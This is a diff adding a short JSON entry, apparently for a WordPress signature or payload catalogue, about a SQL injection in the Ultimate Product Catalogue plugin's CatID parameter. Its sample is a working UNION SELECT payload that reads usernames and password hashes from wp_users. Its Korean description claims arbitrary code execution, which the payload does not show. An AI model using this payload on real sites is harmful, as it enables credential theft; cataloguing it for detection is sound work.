@@ -1,0 +1,9 @@
+{
+	"Name": "WordPress SQL Injection-3",
+	"Description": "Plugin Ultimate Product Catalogue\n- 플러그인을 사용할때 필요한 CatID 변수에 적절한 검사(union 구문) 가 존재하지 않아 발생\n- 공격 성공 시 임의의 코드를 실행",
+	"References": [""],
+	"Samples": [
+		"CatID=0+UNION+SELECTuser_login%2Cuser_pass+FROM+wp_users+WHERE+ID%3D1"],
+	"Keywords": [],
+	"Signature": []
+}
